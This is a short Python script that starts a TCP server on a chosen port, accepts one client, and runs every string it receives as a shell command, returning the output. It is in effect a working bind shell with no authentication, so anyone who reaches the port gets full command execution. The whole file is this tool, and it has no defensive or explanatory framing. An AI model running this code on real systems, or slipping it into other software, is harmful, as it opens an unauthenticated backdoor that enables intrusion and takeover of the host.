import argparse
import socket
import subprocess


def start_server(port: int):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("", port))
    server_socket.listen(1)
    print(f"server started on port={port}...")

    conn, addr = server_socket.accept()
    print(f"client connected: {addr}")

    while True:
        print("> ", end="")
        command = conn.recv(1024).decode(encoding="utf-8")
        print(command)

        if command.lower() == "exit":
            print("server stopped")
            break

        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr

        print(output, end="")
        conn.sendall(output.encode(encoding="utf-8"))

    conn.close()
    server_socket.close()


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("port", type=int, default=8080)
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_arguments()
    start_server(args.port)
